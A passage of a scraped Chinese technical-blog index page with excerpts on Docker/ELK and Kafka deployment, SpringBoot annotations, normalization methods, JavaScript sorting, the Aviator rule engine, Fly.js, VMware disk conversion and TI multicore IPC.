哪个版本？直接最新，反正领导发话了，我丝毫不慌。问题来了，那是生产环境，如果真出问题了，我小命还有不，算了不管了
温馨提示：如果操作系统版本不是很新不要安装最新版本docker，⽐如我centos7安装docker最新版，后⾯出现 linux 与 docker 版本的兼容性问题，报错”container init exited prematurely“，卸载docker安装较早版本即可。
安前须知之直接部署 不能使用root用户登录，需要是用root 之外的用户登录到系统。Linux 的内核必须3.0 以上。elasticsearch 、 logstash 、kibana 版本号必须统一 ~ Linux安装JDK并配置环境变量centos系统　运行内存不能小于2G，若低于2G需要修改jvm。 vi {jvm_home}/config/jvm.options
-Xms512m
-xmx512m
安前须知之docker方式部署 问题排查以及解决方法 #获取该docker容器的CONTAINER ID 或者 NAMES docker logs CONTAINER ID/NAMES ❀ 看日志排查问题,如果docker是前段界面,正常的话是不会有日志的,但是如果一直 Restarting 会有详细报错的日志 ,后台日志也都有日志可以查看.
max virtual memory areas vm.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7af17a7a49ab5fc831a023470018375f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5717c91c20e36e63aad4a063df263f89/" rel="bookmark">
			Kafka/Zookeeper集群搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		若采用docker容器化的部署方案可直接跳过前提准备哦~
前提准备 本文使用的是kafka_2.13-2.8.1.tgz
❀ 温馨提示： 该文件集成了zookeeper，因此不需要再特意下载哦~
前提 ❀ 确保有jdk8环境
1、查看版本
java -version
2、安装jdk8(有网环境)
#Ubuntu apt install -y openjdk-8-jdk-headless #CentOS yum install openjdk-8-jdk-headless 3、安装jdk8(无网环境)
jdk-8u221
链接：https://pan.baidu.com/s/1uhrtDj-pG3BsTq8tMiZAlg
提取码：26k2
#解压jdk到当前目录 tar -zxvf jdk-8u221-linux-x64.tar.gz #编辑配置文件，配置环境变量 vi /etc/profile #用vim编辑器来编辑profile文件，在文件末尾添加一下内容（按“i”进入编辑）： export JAVA_HOME=/usr/local/jdk1.8.0_221 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib:$CLASSPATH export JAVA_PATH=${JAVA_HOME}/bin:${JRE_HOME}/bin export PATH=$PATH:${JAVA_PATH} #执行命令 source /etc/profile #查看安装情况 java -version kafka之服务器部署 单机 1、修改zookeeper配置
❀ 修改数据存储路径
温馨提示：修改成自个路径之前，记得先创建目录哦！
vim config/zookeeper.properties
dataDir=/data/kafka/zookeeper # the port at which the clients will connect clientPort=2181 # disable the per-ip limit on the number of connections since this is a non-production config maxClientCnxns=0 # Disable the adminserver by default to avoid port conflicts.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5717c91c20e36e63aad4a063df263f89/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0384d14cfb75bd3548713851fa7b79d4/" rel="bookmark">
			VUE 动态组件 Cannot read property ‘$createElement‘ of undefined [问题已解决]
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VUE 动态组件 Cannot read property '$createElement' of undefined [问题已解决] 问题描述解决方案 问题描述 在vue中使用&lt;component :is="dynamicComponent" /&gt;时,有时候会报错Cannot read property '$createElement' of undefined,导致组件无法渲染.该报错内容十分晦涩,根据报错及debugger堆栈根本找不到有用信息
解决方案 经过我的调试分析,确认原因一般时是由于没有找到组件,通常是由于组件注册名字不正确,例如大小写错误,拼写错误等等情况
在vue中使用component动态组件,必须保持组件注册的名称要与is属性传入的名字一致
请参考以下示例
&lt;template&gt; &lt;div&gt; &lt;!--错误例子,会报错--&gt; &lt;component is='dynamicComponent' /&gt; &lt;!--错误例子--&gt; &lt;!--正确例子--&gt; &lt;component is='DynamicComponent' /&gt; &lt;!--正确例子--&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { components: { DynamicComponent, } } &lt;/script&gt; 如果该文章对您有帮助,请点赞,谢谢!~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71b58ba4c4db0d4706432192c8244898/" rel="bookmark">
			SpringBoot 常用注解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		@RequestMapping
@RequestMapping注解的主要用途是将Web请求与请求处理类中的方法进行映射。Spring MVC和Spring WebFlux都通过RquestMappingHandlerMapping和RequestMappingHndlerAdapter两个类来提供对@RequestMapping注解的支持。
@RequestMapping注解对请求处理类中的请求处理方法进行标注；@RequestMapping注解拥有以下的六个配置属性：
value:映射的请求URL或者其别名
method:兼容HTTP的方法名
params:根据HTTP参数的存在、缺省或值对请求进行过滤
header:根据HTTP Header的存在、缺省或值对请求进行过滤
consume:设定在HTTP请求正文中允许使用的媒体类型
product:在HTTP响应体中允许使用的媒体类型
提示：在使用@RequestMapping之前，请求处理类还需要使用@Controller或@RestController进行标记
下面是使用@RequestMapping的两个示例：
@RequestMapping还可以对类进行标记，这样类中的处理方法在映射请求路径时，会自动将类上@RequestMapping设置的value拼接到方法中映射路径之前，如下：
@RequestBody
@RequestBody在处理请求方法的参数列表中使用，它可以将请求主体中的参数绑定到一个对象中，请求主体参数是通过HttpMessageConverter传递的，根据请求主体中的参数名与对象的属性名进行匹配并绑定值。此外，还可以通过@Valid注解对请求主体中的参数进行校验。
下面是一个使用@RequestBody的示例：
@GetMapping
@GetMapping注解用于处理HTTP GET请求，并将请求映射到具体的处理方法中。具体来说，@GetMapping是一个组合注解，它相当于是@RequestMapping(method=RequestMethod.GET)的快捷方式。
下面是@GetMapping的一个使用示例：
@PostMapping
@PostMapping注解用于处理HTTP POST请求，并将请求映射到具体的处理方法中。@PostMapping与@GetMapping一样，也是一个组合注解，它相当于是@RequestMapping(method=HttpMethod.POST)的快捷方式。
下面是使用@PostMapping的一个示例：
@PutMapping
@PutMapping注解用于处理HTTP PUT请求，并将请求映射到具体的处理方法中，@PutMapping是一个组合注解，相当于是@RequestMapping(method=HttpMethod.PUT)的快捷方式。
下面是使用@PutMapping的一个示例：
@DeleteMapping
@DeleteMapping注解用于处理HTTP DELETE请求，并将请求映射到删除方法中。@DeleteMapping是一个组合注解，它相当于是@RequestMapping(method=HttpMethod.DELETE)的快捷方式。
下面是使用@DeleteMapping的一个示例：
@PatchMapping
@PatchMapping注解用于处理HTTP PATCH请求，并将请求映射到对应的处理方法中。@PatchMapping相当于是@RequestMapping(method=HttpMethod.PATCH)的快捷方式。
下面是一个简单的示例：
@ControllerAdvice
@ControllerAdvice是@Component注解的一个延伸注解，Spring会自动扫描并检测被@ControllerAdvice所标注的类。@ControllerAdvice需要和@ExceptionHandler、@InitBinder以及@ModelAttribute注解搭配使用，主要是用来处理控制器所抛出的异常信息。
首先，我们需要定义一个被@ControllerAdvice所标注的类，在该类中，定义一个用于处理具体异常的方法，并使用@ExceptionHandler注解进行标记。
此外，在有必要的时候，可以使用@InitBinder在类中进行全局的配置，还可以使用@ModelAttribute配置与视图相关的参数。使用@ControllerAdvice注解，就可以快速的创建统一的，自定义的异常处理类。
下面是一个使用@ControllerAdvice的示例代码：
@ResponseBody
@ResponseBody会自动将控制器中方法的返回值写入到HTTP响应中。特别的，@ResponseBody注解只能用在被@Controller注解标记的类中。如果在被@RestController标记的类中，则方法不需要使用@ResponseBody注解进行标注。@RestController相当于是@Controller和@ResponseBody的组合注解。
下面是使用该注解的一个示例
@ExceptionHandler
@ExceptionHander注解用于标注处理特定类型异常类所抛出异常的方法。当控制器中的方法抛出异常时，Spring会自动捕获异常，并将捕获的异常信息传递给被@ExceptionHandler标注的方法。
下面是使用该注解的一个示例：
@ResponseStatus
@ResponseStatus注解可以标注请求处理方法。使用此注解，可以指定响应所需要的HTTP STATUS。特别地，我们可以使用HttpStauts类对该注解的value属性进行赋值。
下面是使用@ResponseStatus注解的一个示例：
@PathVariable
@PathVariable注解是将方法中的参数绑定到请求URI中的模板变量上。可以通过@RequestMapping注解来指定URI的模板变量，然后使用@PathVariable注解将方法中的参数绑定到模板变量上。
特别地，@PathVariable注解允许我们使用value或name属性来给参数取一个别名。下面是使用此注解的一个示例：
模板变量名需要使用{ }进行包裹，如果方法的参数名与URI模板变量名一致，则在@PathVariable中就可以省略别名的定义。
下面是一个简写的示例：
提示：如果参数是一个非必须的，可选的项，则可以在@PathVariable中设置require = false
@RequestParam
@RequestParam注解用于将方法的参数与Web请求的传递的参数进行绑定。使用@RequestParam可以轻松的访问HTTP请求参数的值。
下面是使用该注解的代码示例：
该注解的其他属性配置与@PathVariable的配置相同，特别的，如果传递的参数为空，还可以通过defaultValue设置一个默认值。示例代码如下：
@Controller
@Controller是@Component注解的一个延伸，Spring会自动扫描并配置被该注解标注的类。此注解用于标注Spring MVC的控制器。下面是使用此注解的示例代码：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/71b58ba4c4db0d4706432192c8244898/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3fd60f55bf10ea91627e5ff34b6dc0d9/" rel="bookmark">
			几种常见的归一化方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据归一化是深度学习数据预处理中非常关键的步骤，可以起到统一量纲，防止小数据被吞噬的作用。
一：归一化的概念 归一化就是把所有数据都转化成[0,1]或者[-1,1]之间的数，其目的是为了取消各维数据之间的数量级差别，避免因为输入输出数据数量级差别大而造成网络预测误差过大。
二：归一化的作用 1）为了后面数据处理的方便，归一化可以避免一些不必要的数值问题。
2）为了程序运行时收敛速度更快
3）统一量纲。样本数据的评价标准不一样，需要对其量纲化，统一评价标准，这算是应用层面的需求。
4）避免神经元饱和。就是说当神经元的激活在接近0或者1时，在这些区域，梯度几乎为0，这样在反向传播过程中，局部梯度就会接近于0，这样非常不利于网络的训练。
5）保证输出数据中数值小的不被吞食。
三：归一化的类型 1：线性归一化 线性归一化也被称为最小-最大规范化；离散标准化，是对原始数据的线性变换，将数据值映射到[0,1]之间。用公式表示为：
差标准化保留了原来数据中存在的关系，是消除量纲和数据取值范围影响的最简单的方法。代码实现如下：
def MaxMinNormalization(x,Max,Min): x = (x - Min) / (Max - Min); return x 适用范围：比较适用在数值比较集中的情况
缺点：1）如果max和min不稳定，很容易使得归一化的结果不稳定，使得后续使用效果也不稳定。如果遇到超过目前属性[min,max]取值范围的时候，会引起系统报错。需要重新确定min和max。
2）如果数值集中的某个数值很大，则规范化后各值接近于0，并且将会相差不大。（如 1,1.2,1.3,1.4,1.5,1.6,10）这组数据。
2：零-均值归一化（Z-score标准化） Z-score标准化也被称为标准差标准化，经过处理的数据的均值为0，标准差为1。其转化公式为：
其中为原始数据的均值，为原始数据的标准差，是当前用的最多的标准化公式
这种方法给予原始数据的均值（mean）和标准差（standard deviation）进行数据的标准化。经过处理的数据符合标准正态分布，即均值为0，标准差为1，这里的关键在于复合标准正态分布
代码实现如下：
def Z_ScoreNormalization(x,mu,sigma): x = (x - mu) / sigma; return x 3：小数定标规范化 这种方法通过移动属性值的小数数位，将属性值映射到[-1,1]之间，移动的小数位数取决于属性值绝对值的最大值。转换公式为：
4:非线性归一化 这个方法包括log，指数，正切
适用范围：经常用在数据分析比较大的场景，有些数值很大，有些很小，将原始值进行映射。
四：批归一化（BatchNormalization） 1：引入 在以往的神经网络训练时，仅仅只对输入层数据进行归一化处理，却没有在中间层进行归一化处理。虽然我们对输入数据进行了归一化处理，但是输入数据经过了这样的矩阵乘法之后，其数据分布很可能发生很大改变，并且随着网络的层数不断加深。数据分布的变化将越来越大。因此这种在神经网络中间层进行的归一化处理，使得训练效果更好的方法就被称为批归一化（BN）
2：BN算法的优点 1）减少了人为选择参数
2）减少了对学习率的要求，我们可以使用初始状态下很大的学习率或者当使用较小的学习率时，算法也能够快速训练收敛。
3）破换了原来的数据分布，一定程度上缓解了过拟合（防止每批训练中某一个样本经常被挑选到）
4）减少梯度消失，加快收敛速度，提高训练精度。
3：批归一化（BN）算法流程 输入：上一层输出结果X={x1,x2,.....xm},学习参数，
算法流程：
1）计算上一层输出数据的均值：
其中，m是此次训练样本batch的大小。
2）计算上一层输出数据的标准差：
3)归一化处理得到
公式中的是为了避免分母为0而加进去接近于0的很小的值。
4）重构，对经过上面归一化处理得到的数据进行重构，得到：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3fd60f55bf10ea91627e5ff34b6dc0d9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2b893c1861f5548143c92f419722d59/" rel="bookmark">
			kafka基本知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		kafka 消息队列是什么，解决什么样的问题，有什么常见的应用场景 MQ（message queue）消息队列是本质上是队列（先进先出的数据结构），生产者将消息放到队列上，消费者通过，消息的消费者通过拉取或者订阅推送的机制来获取消息。
解决的问题：
mq本质上是一种通信机制，它屏蔽到了底层繁琐的http或者tcp通信的细节，提供一套消息队列机制。
解耦：当一个业务需要多个模块的配合，一条消息需要多个系统的处理时，可以使用消息队列机制降低整个系统的耦合度。
异步：主任务执行结束之后，从业务通过异步的方式进行处理，降低系统的响应时间，提高用户体验。
削峰：在多线程的系统当中业务采用异步的方式处理，提高整个系统的性能，避免系统瘫痪。
消息队列的分类 当前消息的队列的分类，当前消息队列的分类大致上分为有broker的消息队列和无broker的消息队列（代表为zero MQ），有broker的队列又分为重Topic（kafka，Rocket MQ，Active MQ）的队列和轻Topic的队列（Rabbit MQ）。
kafka的基本介绍（给一个定义） kafka是一个基于zookeeper协调的，支持分区的多副本的分布式系统
kafka的基本概念（架构） kafka是一个基于生产者和消费者的消息队列，其中的消息队列由broker（中间件处理节点）存储和管理，生产者负责将消息发送到broker上，消费者从broker上消费消息。
broker中的各种概念 Topic topic是消息的主题，kafka使用topic将消息分类
默认主题：
kafka中存在_consumer_offset这个topic，它用于记录所有的consumerGroup的消费偏移量，将ConsumerGroupID+Topic+partition作为key将offset作为值存储。由于这个主题可能会引起大并发问题所以kafka默认将其分为50个分区来存储，并且根据hash（consumer——groupid）来计算消息锁使用的分区。
Partition 物理上的概念，⼀个topic可以分为多个partition，每个partition内部消息是有序的 。
使用partition的的好处主要是可以将 分布式存储和并发写。
所有的消息全部存储在data/kafka-logs/topic-partition中
副本 副本顾名思义就是分区的备份。
如果存在多个broker就可以为分区设置多个备份，分区中有这么几个需要知道的概念。replicas代表当前分区的所有节点，isr代表已同步的节点是，leader和flower是相对的概念，kafka会在多个副本中选取一个副本作为leader，所有对这个分区的读写操作都在再leader上完成，并且在读写完成之后将消息同步到flower上，当leader挂掉了就会使用选举机制启动其中一个flower作为新的leader。
producer细节 基本的消息发送流程：
设定消息发送的broker地址序列化和反序列化规则之后，通过这些规则创建一个Producer用于发送消息。在发送消息的时候会在producer端创建一个32k的缓冲区，并且有一个专门的线程去缓冲区中获取消息并且发送，当消息数据满16k或者时间到达10ms时会发送数据。
发送的方式：
消息发送的方式分为同步发送和异步发送两种，同步发送时业务会暂停等待ack的回复，如果没有收到回复就会默认重新发送，如果收到ack需要查看当前ack的配置（配置有三种0代表只要收到ack不管broker的情况直接代表消息发送成功，1代表需要broker中将leader的消息同步到log中，-1则代表不但需要同步到leader中还需要同步到flower中至于同步到几个flower中由min-insync-replicas指定。这三种ack的设置性能上递减，安全性上递增。）。异步发送的方式就是在发送消息的时候不会阻塞等待，而是使用一个回调方法来后续跟踪消息的情况，这种方式容易丢失消息。
发送到的地方：
在发送的时候可以指定分区也可以使用一个key使用hash算法指定分区。
consumer细节 consumergroup的概念：多个消费者属于一个消费者组，一个消费者组中的消费者只能消费一次同一条消息。我们可以查看当前消费者组中的消费者有哪些，每个消费者的current_offset,log_end_offset,lag等
单播消息和多播消息：
单播消息值得是一条消息只能被一个消费者组中的一个消费者消费也就是一个消息只被消费一次，多播消息指的是可以创建多个消费者组这样多个消费者组中就能够有多个消费者能够消费同一条消息。
消费者和分区的关系：
消费者和分区的关系是一个一对多的关系一个消费者可以消费多个分区但是一个分区只能由一个消费者消费，所以建议消费者的数量应该小于分区的数量否则多余的消费者就只能当做备选。
如何消费：
基本的消费流程
最基本的消费流程就是指定好需要消费的broker的地址，消费组信息，序列化反序列化的配置之后创建一个消费者。然后消费者订阅主题之后消费。
指定分区消费
消费过程中可以指定分区消费，回溯消费指定偏移量消费或者指定时间点消费。
poll的流程
poll消息的流程大致是这样的我们可以根据消费者的消费能力指定每次poll的消息数量和一次长轮询时间，当poll的消息数量达到我们设置的值或者时间达到长轮询的时间之后poll1结束。在poll的过程当中消费者如果消费能力太差导致两次poll的时间超出设置的默认值就会发生rebalance，或者维持的心跳包没有按时发送给broker也会发生rebalance。
消费结束后offset提交方式
offset的提交方式分为自动提交和手动提交两种，自动提交指的是每次poll到消息之后直接提交offset，这回出现消息丢失的问题。手动提交又分为手动同步提交和自动异步提交，区别就在于是否阻塞。
如果有新的消费者组加入了怎么办
kafka的一些机制 controller机制：
根据zk中创建broker节点的时间，最快创建的一个broker会被选择作为controller，它的作用就是在leader挂掉的时候通过在isr中选择同步性能好的一个flower作为leader继续工作，还有就是在新增分区或者broker的时候在各个broker之间同步。
rebalance机制：
它讲述的是分区和消费之组中消费者的关系，当消费者没有指定分区消费的时候，或者消费者和分区的关系发生变化时会触发这个机制。它有range（根据公式来计算分配的分区个数），轮询分配以及sticky（在不改变原来分配的基础上重新分配）三种方式
HW和LEO
LEO（log_end_offset）：最后消费位置。
HW指的是高水位，kafka需要维持一个高水位，就是说当所有的消息都到达高水位之后才能暴露给消费者消费，否则会出现重复消费的情况。
面试题 如何保证顺序消费
保证一个消费者，一个分区
如何保证消息不重复消费
两种方式，第一种是关闭重试机制，第二种是在消费者端设置一些幂等性的操作，比如说分布式锁，或者创建联合主键。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d2b893c1861f5548143c92f419722d59/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cde2346b5be6eb3094612794a65c8aa7/" rel="bookmark">
			javaScript实现排序算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇博客对js中常见的排序算法作了小结，方便日后的复习。主要为冒泡、选择、插入、快排、堆排、归并这六种排序方法
排序算法 一、冒泡排序二、选择排序3、插入排序4、快速排序1.引入库2.读入数据 总结 先贴一张时间复杂度
一、冒泡排序 平均时间复杂度O(n²)双层for循环，两两比较相邻元素 function bubbleSort(arr) { let len = arr.length; for(let i = 0; i &lt; len; i++) { for(let j = 0; j &lt; len - 1 - i; j++) { if(arr[j] &gt; arr[j + 1]) { // 可以使用tmp交换两个元素，也可以使用下面的es6解构赋值 [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]]; } } } return arr; } 示例：pandas 是基于NumPy 的一种工具，该工具是为了解决数据分析任务而创建的。
二、选择排序 最稳定的排序算法之一，因为无论什么数据进去都是O(n²)的时间复杂度从没有排序的数组中，选择最小的元素放在第一位；再从余下元素中选择最小的元素放在第二位，以此类推。n个记录的直接选择排序可经过n-1趟直接选择排序得到有序结果 function selectSort(arr) { let len = arr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cde2346b5be6eb3094612794a65c8aa7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19896a0f656b565f53c16c0547fef72f/" rel="bookmark">
			Aviator规则引擎保姆级教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、aviator是什么？二、入门和安装1.引入依赖2.第一个示例3.使用说明 二、进阶使用1.算术运算表达式2.逻辑表达式3.官方函数4.自定义函数 前言 你的业务项目是否有很多规则需要判断？规则是否经常变动？如果全部用代码开发是不是每次变动都需开发人员改动代码逻辑，重新编译、部署上线？是不是觉得非常繁琐麻烦？
本文推荐使用aviator规则引擎来处理此类场景的问题，做到规则可动态配置、自定义函数、无需打包重启程序。
本文主要讲解aviator的基本使用以及他的各种函数如何调用
一、aviator是什么？ AviatorScript 起源于 2010 年左右，由国内个人开发者Dennis开源的java轻量化规则引擎。官方文档地址
能处理运算表达式、逻辑判断表达式、可以使用if/elsif/else 条件语句、可以自定义函数…
二、入门和安装 1.引入依赖 &lt;dependency&gt; &lt;groupId&gt;com.googlecode.aviator&lt;/groupId&gt; &lt;artifactId&gt;aviator&lt;/artifactId&gt; &lt;version&gt;{version}&lt;/version&gt; &lt;/dependency&gt; version 版本可以在 maven 找到，本指南编写的版本面向 5.0.0 及以上版本
2.第一个示例 // Compile a script Expression script = AviatorEvaluator.getInstance().compile("println('Hello, AviatorScript!');"); script.execute(); 3.使用说明 Aviator支持两种方式执行表达式，
1）直接使用字符串，把需要执行的表达式用字符串拼接的方法搞定之后直接丢给Aviator，返回值就是运行结果。
2）使用Aviator的脚本文件 .av，语法规则类似于js，可在其中写很多复杂的逻辑判断，调用时候指定文件路径即可。
本人项目使用的是第一种方法，因为规则都是系统上线之后用户自定义配置的，无法提前写好脚本，只能通过字符串拼接的方法执行
二、进阶使用 1.算术运算表达式 整数例如 -99、0、1、2、100……等等，Aviator中并没有 byte/short/int 等类型，统一整数类型都为 long
数字除了整数之外，Aviator同样支持浮点数，但是仅支持 double 类型，也就是双精度 64 位
可以直接使用 **+ - * / ** 符号进行算术运算，例如：
let a = 99; let b = 0xFF; let c = -99; println(a + b); println(a / b); println(a- b + c); println(a + b * c); println(a- (b - c)); println(a/b * b + a % b); 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/19896a0f656b565f53c16c0547fef72f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61d610fda9dde0c0d29615bedbf372cb/" rel="bookmark">
			fly.js使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文地址：http://www.voidcc.com/project/fly 项目信息 Fly.js 是一个基于 promise 的，轻量且强大的Javascript http 网络库 51 1,686 221 0 2018-09-06
开发语言: JavaScript 开源协议: MIT
项目代码: Github - fly
项目作者: wendux 作者主页: Github - wendux
项目描述 English|中文简体
正在上传…重新上传取消
转存失败重新上传取消 Fly.js 一个支持所有JavaScript运行环境的基于Promise的、支持请求转发、强大的http请求库。可以让您在多个端上尽可能大限度的实现代码复用。
浏览器支持 转存失败重新上传取消转存失败重新上传取消转存失败重新上传取消转存失败重新上传取消转存失败重新上传取消转存失败重新上传取消✔✔✔✔✔&gt; 8 其它支持的平台 正在上传…重新上传取消 目前Fly.js支持的平台包括：Node.js 、微信小程序 、Weex 、React Native 、Quick App 和浏览器，这些平台的 JavaScript 运行时都是不同的。更多的平台正在持续添加中，请保持关注。
简介 Fly.js 是一个基于 promise 的，轻量且强大的Javascript http 网络库，它有如下特点：
提供统一的 Promise API。浏览器环境下，轻量且非常轻量 。支持多种JavaScript 运行环境支持请求／响应拦截器。自动转换 JSON 数据。支持切换底层 Http Engine，可轻松适配各种运行环境。浏览器端支持全局Ajax拦截 。H5页面内嵌到原生 APP 中时，支持将 http 请求转发到 Native。支持直接请求图片。 定位与目标 Fly 的定位是成为 Javascript http请求的终极解决方案。也就是说，在任何能够执行 Javascript 的环境，只要具有访问网络的能力，Fly都能运行在其上，提供统一的API。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/61d610fda9dde0c0d29615bedbf372cb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47c9d1e1365a2b96e4a29e286e83a417/" rel="bookmark">
			虚拟机挂起后硬盘响应变慢，SCSI转IDE方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VMware Workstation 将虚拟机挂起后，电脑会很卡，SCSI转换成IDE就可以了www.360doc.com/content/15/0405/09/10098873_460727712.shtml 用过 VMware Workstation 的人，不知道有没有发现，有的时候将虚拟挂起（也就是待机）时，电脑突然会变得很慢，很卡。 要过上很长一段时间才会有反应过来，有的配置稍差点的电脑，直接不动了，只好强制关机。 以前我遇到这种情况只有不断的按 Caps Lock 键，让它稍微有点反应，其实很多时候我们电脑卡住的时候，不断的按这个键，能让它很快的反应过来， 否则你就要等它老半天。 有时等不下去时，就强制关机了，这样其实对电脑不好的，损伤最大的还是硬盘。 这个问题让我苦恼了一两年，刚开始以为是系统用久了，后来主机系统里面什么都不安装，它还是这样。 我曾想过是数据文件太大，比如几个G，甚至30G以上，但是这个马上又被我排除，因为有个WIN XP SP3，占用40多G，为啥它不会有这个问题？ 接下来我就只好慢慢的排除了： 1.内存，会不会是其它虚拟机占用较大的内存；结果发现有一个WIN 2003 比XP这个占用内存更小 2.显卡加速，发现关掉这个3D图形加速，还是一样的结果 3.有几次我将虚拟机WIN7重启后没有发现卡的问题，我就在想原因在哪里，回想以前卡住的时候，硬盘灯在不断的亮 其实以前就怀疑过硬盘的原因，但是以前是原配西数黑盘，也有这个问题，现在换成希捷混合硬盘还有这个问题，应该跟硬盘本身没有问题。 就在我苦思无果的时候，突然看到WIN XP SP3 这个虚拟机的硬盘是 IDE模式，难道是VMware 的SCSI驱动不行？ 然后一看，其它都是SCSI驱动。 随便上网便搜索了一下：
vmware scsi 挂起后 主机超慢 http://www.baidu.com/s?ie=utf-8&amp;bs=vmware+scsi+%E5%AF%BC%E8%87%B4%E7%A1%AC%E7%9B%98%E5%8F%98%E6%85%A2&amp;f=8&amp;rsv_bp=1&amp;wd=vmware+scsi+%E6%8C%82%E8%B5%B7%E5%90%8E+%E4%B8%BB%E6%9C%BA%E8%B6%85%E6%85%A2&amp;rsv_sug3=9&amp;rsv_sug1=9&amp;rsv_sug4=476&amp;inputT=7914 果然不出我所料，也有人遇到过这个问题。 http://hi.baidu.com/zhiyanzhai33/item/7cc4a44fec7a27ea1e19bccf 照这个里面说的，只要正常关机，就不会卡，我后来测试了，如果是“休眠”模式也不会卡，注意是“休眠”不是待机（或睡眠，或者叫挂起），休眠类似关机，只是数据处理和待机是一样的而已，所以“休眠”和关机 都是属于完全关闭设备。 最后总结：如果你的硬盘够快，虚拟机里同可以考虑用IDE，我至今没有发现用IDE的虚拟机有问题。 在WIN7虚拟机中，用的也是SCSI硬盘，所以我经常发现打开它里面的一些文件夹时，会卡在那里，要等很长时间才会有反应，看来是应该找个时候换成IDE硬盘了。 如何把VMware Workstation使用的虚拟SCSI磁盘转换成虚拟IDE硬盘 摘自：http://blog.sina.com.cn/s/blog_7525b71f0101d0u8.html
某些特殊的软件限定只能运行在IDE硬盘上。如果你想在虚拟机（使用虚拟SCSI磁盘）里使用该软件，又不想重新创建一个虚拟机，你可以使用下面的办法把虚拟SCSI磁盘转换成虚拟IDE硬盘。
注意1：建议完整阅读全文后再动手，不要边看边做，以免发生悲剧。
注意2：按本文对虚拟磁盘进行修改后所导致的一切后果均与本人无关。
1、关闭要修改的虚拟机。
2、删除这个虚拟机所有的快照。
3、（可选）如果要转换的虚拟磁盘是single file的，可以参考这个KB把它转换成 2 GB分割的多个文件。
4、打开Virtual Machine Settings的界面，记住这个虚拟磁盘的文件名，比如D:\vm\Windows_7_x64_LL2G\Windows 7 x64.vmdk，一会儿会用到这个信息。
5、选中这个虚拟机，单击[Remove]
6、在本地文件系统中找到第4步中记录的虚拟磁盘文件D:\vm\Windows_7_x64_LL2G\Windows 7 x64.vmdk。用文本编辑器打开。找到ddb.adapterType = "buslogic" 这一行，我的原来是"lsilogic"。将 "buslogic" 或"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/47c9d1e1365a2b96e4a29e286e83a417/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9733f5817ed3e940f6130f0bb1cd4f52/" rel="bookmark">
			核间通信（IPC）的两种解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者：Fredy Zhang
近年来，处理器性能越来越强，无论是通用处理器还是嵌入式处理器，都进入了多核处理器时代，多核处理器中，每个核心不能独立工作，需要协同工作才能充分发挥处理器的性能，也就是需要高效的核间通信（Inter-processor Communication）机制。核间通信的主要目标是，充分利用硬件提供的机制，实现高效的核间通信，从而充分发挥Soc的整体性能。
核间通信（IPC）方案简介
TI J7 DRA8xx/TDA4xx、AM65xx、J6家族的处理器，基于异构、可扩展的架构开发，拿TDA4VM的处理器来说，该处理器包含了TI DSP处理器（C66/C7x）、Cortex A72、Main域Cortex R5F、MCU域Cortex R5F、深度学习加速器MMA、图形处理器GPU等核，属于多核异构的架构。Cortex A72可用于通用计算、图形处理器GPU用于3D图像的加速、DSP可用于算法的加速、C7x/MMA可支持深度学习的处理、Cortex-R5F可用于外设的控制和图像的前后处理等。多核异构的优点是采用适合的核做擅长的事，再加上专用硬件加速器也可处理特定任务，从而在性能、功耗和成本 上达到最佳平衡。
核间通信（IPC）从软件的角度来讲， IPC提供了运行在处理器上的软件接口，可供客户调用，从而实现在多核处理器中核与核之间的通信。举个例子来说，如图1: TI Jacinto7软件框架紫色框模块所示，每个核上都运行了IPC软件模块，从而实现了TDA4VM上不同核之间的核间通信。本文的后续部分将以TDA4VM为例说明TI多核异构处理器的核间通信方案，对于其它Jacinto7处理器、AM65xx、J6 等多核环境中的处理器之间进行通信采用的是同样的方式。
图1 ： TI Jacinto7 TDA4VM SW Framework
